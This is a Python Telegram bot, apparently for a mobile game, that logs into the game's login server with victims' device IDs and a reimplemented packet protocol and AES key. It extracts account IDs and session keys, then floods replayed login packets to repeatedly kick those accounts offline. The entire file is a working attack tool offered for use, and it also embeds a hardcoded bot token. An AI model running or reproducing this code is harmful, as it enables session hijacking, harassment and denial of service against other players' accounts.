#!/usr/bin/env python3
# ===================================================================
# PREMIUM DEVID SEKER - TELEGRAM BRUTE FORCE v8.1
# Admin-only spam-login kicker · up to 5 devices · single-login fix
# ===================================================================
# ROOT CAUSE of "login failed pid 2" in v8.0:
#   fetch_session_profile called GameLogin.run() first (socket A: login,
#   read PID 2, close), then GameConn.login_srv() opened socket B and
#   logged in again from the same device_unique_id within milliseconds.
#   The login server treats the second login as a duplicate and returns
#   PID 2 with no session_key / wrong shape.
# FIX: one GameConn does login -> get_gs -> conn_gs -> skin -> ban on
#      a single socket. Retries on transient. Robust tag parsing.
# ===================================================================

import os, sys, time, json, socket, zlib, struct, threading, asyncio
from enum import Enum
from typing import Tuple, Dict, Any, Optional, List
from datetime import datetime, timezone, timedelta
from concurrent.futures import ThreadPoolExecutor

import zstandard as zstd
from Crypto.Cipher import AES

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)
from telegram.error import BadRequest
from telegram.request import HTTPXRequest

# ────────────────────────────────────────────────────────────────
# CONFIG
# ────────────────────────────────────────────────────────────────
BOT_TOKEN   = "8857859353:AAEnkQ_uyH9SUH--Ei-bl-zoCtujMIswxDY"
ADMIN_ID    = 8621676055
BOT_NAME    = "Premium DevID Seker · BF"
BOT_VERSION = "8.1"

TZ_WIB = timezone(timedelta(hours=7))

AES_KEY        = bytes.fromhex('2dd646797ec5a7ae563a37ce5e6d8576')
AES_IV         = b'\x00' * 16
SERVER_HOST    = 'login.ml.youngjoygame.com'
SERVER_PORT    = 30021
CLIENT_VERSION = '2.2.16.1232.1'
CHANNEL        = 'and_usa'
LANGUAGE       = 'en'

MAX_DEVICES    = 5
MAX_THREADS    = 5

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_DIR  = os.path.join(BASE_DIR, "BF_LOGS")
os.makedirs(LOG_DIR, exist_ok=True)
BF_LOG   = os.path.join(LOG_DIR, "bruteforce_session.txt")

# ────────────────────────────────────────────────────────────────
# RANK MAP
# ────────────────────────────────────────────────────────────────
def map_rank(p) -> str:
    if not p or not isinstance(p, (int, float)) or p <= 0:
        return "Unranked"
    p = int(p)
    if p >= 136:
        s = p - 136
        if s >= 100: return f"Mythical Immortal ({s}★)"
        if s >= 50:  return f"Mythical Glory ({s}★)"
        if s >= 25:  return f"Mythical Honor ({s}★)"
        return f"Mythic ({s}★)"
    for th, name, ds, dn in [
        (105, "Legend", 5, ["V","IV","III","II","I"]),
        (75,  "Epic",   5, ["V","IV","III","II","I"]),
        (45,  "Grandmaster", 5, ["V","IV","III","II","I"]),
        (25,  "Master", 4, ["IV","III","II","I"]),
        (10,  "Elite",  3, ["IV","III","II","I"]),
        (1,   "Warrior",3, ["III","II","I"]),
    ]:
        if p >= th:
            off = p - th
            di  = min(len(dn)-1, off // ds)
            st  = (off % ds) + 1
            return f"{name} {dn[di]} ({st}★)"
    return "Warrior III (1★)"

# ────────────────────────────────────────────────────────────────
# SDP PROTOCOL
# ────────────────────────────────────────────────────────────────
class SdpDataType(Enum):
    INTEGER_POSITIVE=0; INTEGER_NEGATIVE=1; FLOAT=2; DOUBLE=3
    STRING=4; LIST=5; DICT=6; STRUCT_BEGIN=7; STRUCT_END=8

class SdpStruct(dict):
    def __init__(self, data=None):
        super().__init__()
        self.data = b''; self.offset = 0
        if isinstance(data, bytes):
            self.data = data; self._unpack()
        elif data is not None:
            self.update(data); self._pack()

    def _pack(self):
        self.data = bytes([SdpDataType.STRUCT_BEGIN.value << 4])
        for k, v in sorted(self.items()): self._pack_item(k, v)
        self.data += bytes([SdpDataType.STRUCT_END.value << 4])

    def _unpack(self):
        if not self.data: return
        if self.data[0] >> 4 == SdpDataType.STRUCT_BEGIN.value:
            self.offset = 1
        while self.offset < len(self.data):
            k, v = self._unpack_item()
            if isinstance(v, SdpDataType) and v == SdpDataType.STRUCT_END:
                break
            self[k] = v

    def _write_varint(self, n):
        r = bytearray()
        while n >= 0x80: r.append((n & 0x7F) | 0x80); n >>= 7
        r.append(n & 0x7F); return bytes(r)

    def _read_varint(self):
        n = 1; val = self.data[self.offset] & 0x7F
        while self.data[self.offset + n - 1] >= 0x80:
            val |= (self.data[self.offset + n] & 0x7F) << (7 * n); n += 1
        self.offset += n; return val

    def _pack_header(self, t, d):
        if t < 15: self.data += bytes([(d.value << 4) | t])
        else:      self.data += bytes([(d.value << 4) | 15]) + self._write_varint(t)

    def _pack_item(self, t, v):
        if isinstance(v, bool):
            self._pack_header(t, SdpDataType.INTEGER_POSITIVE)
            self.data += self._write_varint(1 if v else 0)
        elif isinstance(v, int):
            if v < 0:
                self._pack_header(t, SdpDataType.INTEGER_NEGATIVE)
                self.data += self._write_varint(-v)
            else:
                self._pack_header(t, SdpDataType.INTEGER_POSITIVE)
                self.data += self._write_varint(v)
        elif isinstance(v, float):
            self._pack_header(t, SdpDataType.DOUBLE)
            self.data += self._write_varint(8) + struct.pack("<d", v)
        elif isinstance(v, (str, bytes)):
            self._pack_header(t, SdpDataType.STRING)
            e = v.encode('utf-8') if isinstance(v, str) else v
            self.data += self._write_varint(len(e)) + e
        elif isinstance(v, list):
            self._pack_header(t, SdpDataType.LIST)
            self.data += self._write_varint(len(v))
            for i in v: self._pack_item(0, i)
        elif isinstance(v, dict):
            if isinstance(v, SdpStruct):
                self._pack_header(t, SdpDataType.STRUCT_BEGIN)
                for k, x in sorted(v.items()): self._pack_item(k, x)
                self.data += bytes([SdpDataType.STRUCT_END.value << 4])
            else:
                self._pack_header(t, SdpDataType.DICT)
                self.data += self._write_varint(len(v))
                for k, x in sorted(v.items()):
                    self._pack_item(0, k); self._pack_item(0, x)

    def _unpack_item(self):
        if self.offset >= len(self.data): return 0, None
        h = self.data[self.offset]; t = h & 0xF; d = SdpDataType(h >> 4)
        self.offset += 1
        if t == 15: t = self._read_varint()
        if d == SdpDataType.INTEGER_POSITIVE: return t, self._read_varint()
        if d == SdpDataType.INTEGER_NEGATIVE: return t, -self._read_varint()
        if d == SdpDataType.DOUBLE:
            return t, struct.unpack("<d", self._read_varint().to_bytes(8,'little'))[0]
        if d == SdpDataType.STRING:
            l = self._read_varint(); r = self.data[self.offset:self.offset+l]; self.offset += l
            try:    return t, r.decode('utf-8')
            except: return t, r
        if d == SdpDataType.LIST:
            l = self._read_varint()
            return t, [self._unpack_item()[1] for _ in range(l)]
        if d == SdpDataType.DICT:
            l = self._read_varint(); res = {}
            for _ in range(l):
                _, k = self._unpack_item(); _, v = self._unpack_item(); res[k] = v
            return t, res
        if d == SdpDataType.STRUCT_BEGIN:
            res = {}
            while True:
                k, v = self._unpack_item()
                if isinstance(v, SdpDataType) and v == SdpDataType.STRUCT_END: break
                res[k] = v
            return t, SdpStruct(res)
        if d == SdpDataType.STRUCT_END: return t, SdpDataType.STRUCT_END
        return t, None

# ────────────────────────────────────────────────────────────────
# CONNECTION
# ────────────────────────────────────────────────────────────────
class BaseConn:
    def __init__(self, host, port):
        self.host = host; self.port = port; self.seq = 1
        self.sock = None; self.q = b''
    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.host, self.port))
        self.sock.settimeout(8)
    def cleanup(self):
        if self.sock:
            try: self.sock.close()
            except: pass
            self.seq = 1; self.sock = None
    def __enter__(self): self.connect(); return self
    def __exit__(self, *a): self.cleanup()
    def send_data(self, pid, sdp):
        pkt  = SdpStruct({0: pid, 1: self.seq, 5: sdp.data}).data
        comp = zstd.compress(pkt)
        flags = (len(comp) + 4) | (16 << 24)
        self.sock.send(flags.to_bytes(4, 'big') + comp); self.seq += 1
    def recv_data(self):
        try:
            while len(self.q) < 4:
                d = self.sock.recv(4096)
                if not d: return None, None
                self.q += d
            flags = int.from_bytes(self.q[:4], 'big')
            sz = flags & 0xFFFFFF; ct = flags >> 24
            while len(self.q) < sz:
                d = self.sock.recv(4096)
                if not d: return None, None
                self.q += d
            data = self.q[4:sz]; self.q = self.q[sz:]
            if ct == 1:  data = zlib.decompress(data)
            elif ct == 16: data = zstd.decompress(data)
            elif ct in (2, 3, 18):
                c = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                data = c.decrypt(data[:-1] if len(data) % 16 else data).rstrip(b'\x00')
                if ct == 3:  data = zlib.decompress(data)
                elif ct == 18: data = zstd.decompress(data)
            r = SdpStruct(data); pid = r.get(0)
            if pid is None: return None, None
            body = r.get(6) or r.get(5)
            return (pid, SdpStruct(body)) if body and isinstance(body, bytes) else (pid, None)
        except socket.timeout: return -1, None
        except: return None, None

class GameConn(BaseConn):
    """Single-socket flow: login -> get_gs -> conn_gs -> skin -> ban."""
    def __init__(self, dev):
        super().__init__(SERVER_HOST, SERVER_PORT)
        self.dev = dev
        raw = dev.strip()
        if raw.startswith(("and_", "ios_")): raw = raw[4:]
        self.imei    = raw[:32] if len(raw) >= 32 else raw
        self.android = raw[32:48] if len(raw) >= 48 else ""
        self.adid    = raw[48:] if len(raw) > 48 else ""
        self.acc = 0; self.skey = ''; self.zone = 0
        self.ghost = ''; self.gport = 0; self.cts = 0
        self.ban = "NORMAL"
        self.last_pid = None

    def _cred_blob(self) -> str:
        return (f'gps_adid={self.adid}&android_id={self.android}'
                f'&device_unique_id={self.imei}')

    def login_srv(self) -> bool:
        """Robust PID-2 login. Loop reads past any hello/stub packets."""
        if not self.sock or self.host != SERVER_HOST:
            self.cleanup()
            self.host, self.port = SERVER_HOST, SERVER_PORT
            self.connect()
        self.send_data(1, SdpStruct({
            0: self.dev, 1: self._cred_blob(),
            2: CLIENT_VERSION, 3: CHANNEL, 4: LANGUAGE
        }))
        for _ in range(4):
            pid, res = self.recv_data()
            self.last_pid = pid
            if pid in (-1, None): break
            if pid != 2 or not res: continue
            try:
                acc = res.get(0)
                sk  = res.get(1)
                if isinstance(sk, (bytes, bytearray)):
                    sk = sk.decode('utf-8', errors='ignore')
                zone_raw = res.get(2)
                if isinstance(zone_raw, list) and zone_raw:
                    zone = zone_raw[0]
                elif isinstance(zone_raw, int):
                    zone = zone_raw
                else:
                    zone = 0
                cts = res.get(19, 0)
                if acc and isinstance(sk, str) and sk and zone:
                    self.acc = int(acc)
                    self.skey = sk
                    self.zone = int(zone)
                    self.cts = int(cts) if cts else 0
                    self.ban = "NORMAL"
                    return True
            except Exception:
                continue
        self.ban = f"LOGIN FAILED (PID {self.last_pid})"
        return False

    def get_gs(self) -> bool:
        self.send_data(5, SdpStruct({
            0: self.acc, 1: self.skey, 2: CLIENT_VERSION,
            5: self.zone, 6: CHANNEL
        }))
        pid, res = self.recv_data()
        if pid == 6 and res:
            try:
                h, p = str(res.get(1, '')).split(':')
                self.ghost = h; self.gport = int(p); return True
            except Exception:
                return False
        return False

    def conn_gs(self) -> bool:
        self.cleanup()
        self.host, self.port = self.ghost, self.gport
        self.connect()
        self.send_data(10001, SdpStruct({
            0: self.acc, 1: self.skey, 2: self.zone,
            4: CLIENT_VERSION, 13: CHANNEL, 15: self.dev
        }))
        for _ in range(5):
            pid, _ = self.recv_data()
            if pid == 10002: return True
            if pid in (-1, None): break
        return False

    def check_ban(self) -> str:
        try:
            self.send_data(10101, SdpStruct({0: 0, 2: 2}))
            for _ in range(3):
                pid, res = self.recv_data()
                if pid == 20001 and res and isinstance(res, dict) and 0 in res and isinstance(res[0], dict):
                    b = res[0]
                    self.ban = (f"BANNED (Reason: {b.get('ban_reason','Unknown')} "
                                f"| {b.get('endtime_day','0')}d {b.get('endtime_hour','0')}h)")
                    return self.ban
                if pid in (-1, None, 20002): break
        except: pass
        return self.ban

    def skin_info(self, r, z):
        try:
            self.send_data(10143, SdpStruct({0: int(r), 1: int(z)}))
            for _ in range(4):
                pid, res = self.recv_data()
                if pid in (-1, None): break
                if pid == 10144: return res
        except: pass
        return None

# ────────────────────────────────────────────────────────────────
# FETCH SESSION PROFILE — SINGLE LOGIN
# ────────────────────────────────────────────────────────────────
def fetch_session_profile(device_id: str, max_retries: int = 3):
    """Returns (profile_dict, None) on success, (None, err_str) on failure."""
    last_err = "unknown"
    for attempt in range(max_retries):
        try:
            conn = GameConn(device_id)
            if not conn.login_srv():
                last_err = conn.ban
                conn.cleanup()
                time.sleep(0.4); continue
            if not conn.get_gs():
                last_err = "get_gs failed"
                conn.cleanup()
                time.sleep(0.4); continue
            if not conn.conn_gs():
                last_err = "conn_gs failed"
                conn.cleanup()
                time.sleep(0.4); continue

            skin_info = conn.skin_info(conn.acc, conn.zone)
            ban_stat  = conn.check_ban()

            acc, zone = conn.acc, conn.zone
            sess_key  = conn.skey
            gs_host, gs_port = conn.ghost, conn.gport
            cts = conn.cts
            conn.cleanup()

            sk = skin_info if isinstance(skin_info, dict) else {}
            nick      = sk.get(2) or f"Player_{acc}"
            level     = sk.get(3) or 1
            skin_cnt  = sk.get(10) if sk.get(10) is not None else 0
            hero_cnt  = sk.get(9)  if sk.get(9)  is not None else 0
            cur_rv    = sk.get(6, 0) or 0
            max_rv    = sk.get(15, 0) or cur_rv

            return {
                'device_id':    device_id,
                'account_id':   acc,
                'session_key':  sess_key,
                'zone_id':      zone,
                'creation_ts':  cts,
                'game_host':    gs_host,
                'game_port':    gs_port,
                'gs_info':      f"{gs_host}:{gs_port}",
                'nickname':     nick,
                'level':        level,
                'rank':         map_rank(cur_rv),
                'highest_rank': map_rank(max_rv) if max_rv else map_rank(cur_rv),
                'skin_count':   skin_cnt,
                'hero_count':   hero_cnt,
                'ban_status':   ban_stat,
            }, None
        except Exception as e:
            last_err = str(e)
            time.sleep(0.4)
    return None, last_err

# ────────────────────────────────────────────────────────────────
# SESSION KICK
# ────────────────────────────────────────────────────────────────
def send_session_kick(profile: Dict[str, Any], timeout: float = 4.5) -> Tuple[bool, float, str]:
    t0 = time.time(); sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((profile['game_host'], profile['game_port']))
        body = SdpStruct({
            0: profile['account_id'], 1: profile['session_key'],
            2: profile['zone_id'],    4: CLIENT_VERSION,
            13: CHANNEL,              15: profile['device_id']
        }).data
        pkt  = SdpStruct({0: 10001, 1: 1, 5: body}).data
        comp = zstd.compress(pkt)
        flags = (len(comp) + 4) | (16 << 24)
        sock.send(flags.to_bytes(4, 'big') + comp)

        q = b''
        while len(q) < 4:
            d = sock.recv(4096)
            if not d: break
            q += d
        got_ack = False
        if len(q) >= 4:
            fl = int.from_bytes(q[:4], 'big'); sz = fl & 0xFFFFFF
            while len(q) < sz:
                d = sock.recv(4096)
                if not d: break
                q += d
            if len(q) >= sz: got_ack = True
        elapsed_ms = (time.time() - t0) * 1000
        sock.close()
        return True, elapsed_ms, ("ACK" if got_ack else "SENT")
    except socket.timeout:
        try: sock and sock.close()
        except: pass
        return False, (time.time() - t0) * 1000, "TIMEOUT"
    except Exception as e:
        try: sock and sock.close()
        except: pass
        return False, (time.time() - t0) * 1000, str(e)

# ────────────────────────────────────────────────────────────────
# GLOBAL STATE
# ────────────────────────────────────────────────────────────────
active_jobs: Dict[int, Dict] = {}
pending:     Dict[int, Dict] = {}
job_lock = threading.Lock()
start_time = time.time()

# ────────────────────────────────────────────────────────────────
# KEYBOARDS
# ────────────────────────────────────────────────────────────────
def kb_main():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⚡ New BF Session", callback_data="bf_new")],
        [InlineKeyboardButton("📊 Stats",         callback_data="bf_stats"),
         InlineKeyboardButton("📖 Help",          callback_data="bf_help")],
    ])

def kb_mode():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🧪 1x Test",       callback_data="bf_mode:1")],
        [InlineKeyboardButton("⚡ 10x Standard",   callback_data="bf_mode:2")],
        [InlineKeyboardButton("🚀 50x Fast",       callback_data="bf_mode:3")],
        [InlineKeyboardButton("💥 100x Aggressive",callback_data="bf_mode:4")],
        [InlineKeyboardButton("♾️ Unlimited",      callback_data="bf_mode:5")],
        [InlineKeyboardButton("❌ Cancel",         callback_data="bf_cancel")],
    ])

def kb_stop(uid):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🛑 Stop", callback_data=f"bf_stop:{uid}")]
    ])

def kb_back():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔙 Main Menu", callback_data="bf_back")]
    ])

MODES = {
    "1": ("🧪 1x Test",         1,   0.0),
    "2": ("⚡ 10x Standard",    10,  2.0),
    "3": ("🚀 50x Fast",        50,  1.0),
    "4": ("💥 100x Aggressive", 100, 0.5),
    "5": ("♾️ Unlimited",       0,   0.0),
}

# ────────────────────────────────────────────────────────────────
# JOB RUNNER
# ────────────────────────────────────────────────────────────────
def _edit(app, loop, chat_id, msg_id, text, kb=None):
    try:
        asyncio.run_coroutine_threadsafe(
            app.bot.edit_message_text(
                chat_id=chat_id, message_id=msg_id,
                text=text, parse_mode="Markdown", reply_markup=kb
            ), loop
        ).result(timeout=10)
    except Exception:
        pass

def _send(app, loop, chat_id, text, kb=None):
    try:
        asyncio.run_coroutine_threadsafe(
            app.bot.send_message(
                chat_id=chat_id, text=text,
                parse_mode="Markdown", reply_markup=kb
            ), loop
        ).result(timeout=15)
    except Exception:
        pass

def run_bf_job(job, loop, app):
    uid      = job['user_id']
    chat_id  = job['chat_id']
    msg_id   = job['msg_id']
    devices  = job['devices']
    loops    = job['loops']
    delay    = job['delay']
    stop_ev  = job['stop_event']
    mode_lbl = job['mode_label']

    # ── Phase 1: fetch all profiles in parallel ──
    _edit(app, loop, chat_id, msg_id,
          f"🔍 *Verifying {len(devices)} device(s)...*\nThis can take 10–30s.",
          kb_stop(uid))

    profiles: Dict[str, Optional[Dict]] = {}
    errors:   Dict[str, str] = {}

    def fetch(dev):
        p, err = fetch_session_profile(dev)
        profiles[dev] = p
        if err: errors[dev] = err

    with ThreadPoolExecutor(max_workers=min(MAX_THREADS, len(devices))) as ex:
        list(ex.map(fetch, devices))

    valid = {d: p for d, p in profiles.items() if p}

    # Build load report
    lines = [f"🎯 *Targets Loaded* — {len(valid)}/{len(devices)} valid\n"]
    for d, p in valid.items():
        ban_mark = "🔴" if 'ban' in str(p['ban_status']).lower() else "🟢"
        lines.append(f"{ban_mark} *{p['nickname']}* (Lv.{p['level']})")
        lines.append(f"   🆔 `{p['account_id']}` · zone `{p['zone_id']}`")
        lines.append(f"   🏆 {p['rank']} · 🌐 `{p['gs_info']}`")
        lines.append(f"   📱 `{d[:24]}{'…' if len(d) > 24 else ''}`")
    for d in devices:
        if d not in valid:
            lines.append(f"❌ `{d[:24]}…` — {errors.get(d, 'login failed')}")
    lines.append("")
    lines.append(f"⚡ *{mode_lbl}* × delay `{delay}s` — starting…")

    _edit(app, loop, chat_id, msg_id, "\n".join(lines), kb_stop(uid))

    if not valid:
        _send(app, loop, chat_id, "❌ *No valid devices.* All logins failed.",
              kb_back())
        with job_lock: active_jobs.pop(uid, None)
        return

    # ── Phase 2: kick ──
    stats = {d: {'count':0, 'ok':0, 'fail':0, 'lat_sum':0.0, 'lat_n':0} for d in valid}
    stats_lock = threading.Lock()
    start_ts   = time.time()

    def kicker(dev, profile):
        lc = 0
        while not stop_ev.is_set():
            if loops > 0 and lc >= loops: break
            lc += 1
            ok, lat, _ = send_session_kick(profile)
            with stats_lock:
                s = stats[dev]
                s['count'] += 1
                if ok: s['ok']  += 1
                else:  s['fail']+= 1
                s['lat_sum'] += lat
                s['lat_n']   += 1
            if delay > 0 and not stop_ev.is_set():
                time.sleep(delay)

    threads = [threading.Thread(target=kicker, args=(d, p), daemon=True)
               for d, p in valid.items()]
    for t in threads: t.start()

    # ── Monitor + edit ──
    last_edit = 0.0
    while True:
        alive = any(t.is_alive() for t in threads)
        now   = time.time()
        if (now - last_edit) >= 2.5 or not alive:
            last_edit = now
            elapsed    = int(now - start_ts)
            total_c    = sum(s['count'] for s in stats.values())
            total_ok   = sum(s['ok']    for s in stats.values())
            total_fail = sum(s['fail']  for s in stats.values())
            speed      = total_c / max(elapsed, 1)
            head = (f"⚡ *BF Running* — `{elapsed}s` · `{speed:.2f}` kick/s · "
                    f"✅`{total_ok}` ❌`{total_fail}`\n")
            body = []
            for d, s in stats.items():
                p   = valid[d]
                avg = (s['lat_sum'] / s['lat_n']) if s['lat_n'] else 0
                ls  = f"{s['count']}/{loops}" if loops > 0 else f"{s['count']}/∞"
                body.append(f"👤 *{p['nickname']}* — {ls}")
                body.append(f"   ✅{s['ok']} ❌{s['fail']} ⚡{avg:.0f}ms")
            _edit(app, loop, chat_id, msg_id,
                  head + "\n".join(body), kb_stop(uid))
        if not alive: break
        time.sleep(0.4)

    # ── Summary ──
    elapsed    = int(time.time() - start_ts)
    total_c    = sum(s['count'] for s in stats.values())
    total_ok   = sum(s['ok']    for s in stats.values())
    total_fail = sum(s['fail']  for s in stats.values())
    speed      = total_c / max(elapsed, 1)

    out = [f"🏁 *BF Complete* — {elapsed}s · {speed:.2f}/s", ""]
    for d, s in stats.items():
        p   = valid[d]
        avg = (s['lat_sum'] / s['lat_n']) if s['lat_n'] else 0
        pct = s['ok'] / max(s['count'], 1) * 100
        out.append(f"👤 *{p['nickname']}* · `{p['account_id']}`")
        out.append(f"   ✅ {s['ok']} ({pct:.0f}%) · ❌ {s['fail']} · ⚡{avg:.0f}ms")
    out.append("")
    out.append(f"*TOTAL*: `{total_c}` · ✅`{total_ok}` · ❌`{total_fail}`")
    out.append("")
    out.append("✨ *PREMIUM DEVID SEKER* · @Karl08901")

    _edit(app, loop, chat_id, msg_id, "\n".join(out), kb_back())

    # ── Log ──
    try:
        with open(BF_LOG, 'a', encoding='utf-8') as f:
            f.write(f"\n{'='*54}\n")
            f.write(f"{datetime.now(TZ_WIB).strftime('%Y-%m-%d %H:%M:%S WIB')} | {mode_lbl}\n")
            for d, s in stats.items():
                p = valid[d]
                f.write(f"  {p['nickname']} ({p['account_id']}/{p['zone_id']}) "
                        f"OK={s['ok']} Fail={s['fail']}\n")
            f.write(f"  Total={total_c} OK={total_ok} Fail={total_fail} {elapsed}s\n")
    except Exception:
        pass

    with job_lock: active_jobs.pop(uid, None)

# ────────────────────────────────────────────────────────────────
# HANDLERS
# ────────────────────────────────────────────────────────────────
def admin_only(uid) -> bool:
    return uid == ADMIN_ID

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not admin_only(uid):
        await update.message.reply_text(
            "🚫 *Access denied.*\nThis bot is admin-only.", parse_mode="Markdown")
        return
    await update.message.reply_text(
        f"⚡ *{BOT_NAME} v{BOT_VERSION}*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👑 Admin-only spam-login kicker\n"
        f"📱 Up to `{MAX_DEVICES}` devices per session\n"
        f"🔧 Single-login flow (no PID-2 drop)\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Tap below to begin.",
        parse_mode="Markdown", reply_markup=kb_main()
    )

async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not admin_only(update.effective_user.id): return
    await update.message.reply_text(
        f"📖 *{BOT_NAME} Help*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"1. Tap *⚡ New BF Session*\n"
        f"2. Paste up to `{MAX_DEVICES}` device IDs (one per line)\n"
        f"3. Pick kick mode\n"
        f"4. Bot fetches session profiles and spams login\n"
        f"5. Press *🛑 Stop* anytime\n\n"
        f"Commands: /start · /help · /stats · /stop",
        parse_mode="Markdown"
    )

async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not admin_only(update.effective_user.id): return
    uptime = int(time.time() - start_time)
    with job_lock:
        running = len([j for j in active_jobs.values() if j])
    await update.message.reply_text(
        f"📊 *Bot Stats*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"⏱ Uptime   : `{uptime}s`\n"
        f"⚡ Running  : `{running}`\n"
        f"📁 Log file : `BF_LOGS/bruteforce_session.txt`\n"
        f"━━━━━━━━━━━━━━━━━━━━",
        parse_mode="Markdown"
    )

async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not admin_only(uid): return
    with job_lock:
        job = active_jobs.get(uid)
    if job and 'stop_event' in job:
        job['stop_event'].set()
        await update.message.reply_text("🛑 Stopping…")
    else:
        await update.message.reply_text("No active job.")

async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not admin_only(uid): return

    st = pending.get(uid)
    if not st or st.get('state') != 'devices':
        return

    raw = update.message.text or ""
    parts = [p.strip() for p in raw.replace(",", "\n").splitlines() if p.strip()]
    if not parts:
        await update.message.reply_text("❌ No device IDs detected.")
        return
    if len(parts) > MAX_DEVICES:
        await update.message.reply_text(
            f"⚠️ You sent `{len(parts)}` — using first `{MAX_DEVICES}`.",
            parse_mode="Markdown")
        parts = parts[:MAX_DEVICES]

    pending[uid] = {'state': 'mode', 'devices': parts}

    await update.message.reply_text(
        f"✅ *Loaded {len(parts)} device(s)*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        + "\n".join(f"`{d[:28]}{'…' if len(d) > 28 else ''}`" for d in parts)
        + "\n━━━━━━━━━━━━━━━━━━━━\n"
        f"Pick kick mode:",
        parse_mode="Markdown", reply_markup=kb_mode()
    )

async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    try: await q.answer()
    except BadRequest: pass
    uid  = update.effective_user.id
    data = q.data

    if not admin_only(uid):
        await q.answer("Admin only.", show_alert=True); return

    if data == "bf_new":
        with job_lock:
            if uid in active_jobs and active_jobs[uid].get('status') == 'running':
                await q.edit_message_text("⚠️ Job already running. Use /stop.",
                                          parse_mode="Markdown"); return
        pending[uid] = {'state': 'devices'}
        await q.edit_message_text(
            f"📱 *New BF Session*\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"Send up to *{MAX_DEVICES}* device IDs.\n"
            f"One per line, or comma-separated.\n"
            f"━━━━━━━━━━━━━━━━━━━━",
            parse_mode="Markdown"
        ); return

    if data == "bf_help":
        await q.edit_message_text(
            f"📖 *Help*\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"• `/start` — open menu\n"
            f"• `/stats` — bot stats\n"
            f"• `/stop` — kill running job\n"
            f"• Max `{MAX_DEVICES}` devices per session\n"
            f"• Modes: 1x · 10x · 50x · 100x · Unlimited",
            parse_mode="Markdown", reply_markup=kb_back()
        ); return

    if data == "bf_stats":
        uptime = int(time.time() - start_time)
        with job_lock:
            running = len(active_jobs)
        await q.edit_message_text(
            f"📊 *Stats*\n"
            f"⏱ Uptime: `{uptime}s`\n"
            f"⚡ Running: `{running}`\n"
            f"📁 Log: `BF_LOGS/bruteforce_session.txt`",
            parse_mode="Markdown", reply_markup=kb_back()
        ); return

    if data == "bf_back":
        await q.edit_message_text(
            f"⚡ *{BOT_NAME}* — main menu",
            parse_mode="Markdown", reply_markup=kb_main()
        ); return

    if data == "bf_cancel":
        pending.pop(uid, None)
        await q.edit_message_text("❌ Cancelled.", reply_markup=kb_back()); return

    if data.startswith("bf_mode:"):
        mode_key = data.split(":", 1)[1]
        st = pending.get(uid)
        if not st or st.get('state') != 'mode':
            await q.edit_message_text("⌛ Session expired. Tap New BF again.",
                                      reply_markup=kb_back()); return
        devices = st['devices']
        if mode_key not in MODES:
            await q.edit_message_text("❌ Unknown mode.", reply_markup=kb_back()); return

        mode_lbl, loops, delay = MODES[mode_key]
        pending.pop(uid, None)

        with job_lock:
            if uid in active_jobs and active_jobs[uid].get('status') == 'running':
                await q.edit_message_text("⚠️ Already running.", parse_mode="Markdown"); return
            stop_ev = threading.Event()
            job = {
                'user_id': uid,
                'chat_id': q.message.chat_id,
                'msg_id':  q.message.message_id,
                'devices': devices,
                'loops':   loops,
                'delay':   delay,
                'stop_event': stop_ev,
                'mode_label': mode_lbl,
                'status': 'running',
            }
            active_jobs[uid] = job

        await q.edit_message_text(
            f"⚡ *Starting {mode_lbl}*\n`{len(devices)} device(s)`",
            parse_mode="Markdown", reply_markup=kb_stop(uid)
        )

        loop = asyncio.get_running_loop()
        threading.Thread(
            target=run_bf_job, args=(job, loop, ctx.application), daemon=True
        ).start()
        return

    if data.startswith("bf_stop:"):
        target = int(data.split(":", 1)[1])
        if target != uid and uid != ADMIN_ID:
            await q.answer("Not your job.", show_alert=True); return
        with job_lock:
            job = active_jobs.get(target)
        if job and 'stop_event' in job:
            job['stop_event'].set()
            await q.edit_message_text("🛑 Stopping…", parse_mode="Markdown")
        else:
            await q.edit_message_text("No active job.", reply_markup=kb_back())
        return

    await q.answer("Unknown action.", show_alert=True)

# ────────────────────────────────────────────────────────────────
# POST INIT + MAIN
# ────────────────────────────────────────────────────────────────
async def post_init(app: Application) -> None:
    cmds = [
        BotCommand("start", "Open menu"),
        BotCommand("stats", "Bot stats"),
        BotCommand("stop",  "Stop running job"),
        BotCommand("help",  "Help"),
    ]
    await app.bot.set_my_commands(cmds, scope={"type": "chat", "chat_id": ADMIN_ID})
    print(f"🚀 {BOT_NAME} v{BOT_VERSION} online")

def main():
    from telegram.request import HTTPXRequest
    req = HTTPXRequest(
        connect_timeout=30.0, read_timeout=30.0,
        write_timeout=30.0,   pool_timeout=30.0,
    )
    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .request(req)
        .post_init(post_init)
        .build()
    )
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help",  cmd_help))
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(CommandHandler("stop",  cmd_stop))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_handler(CallbackQueryHandler(on_callback))

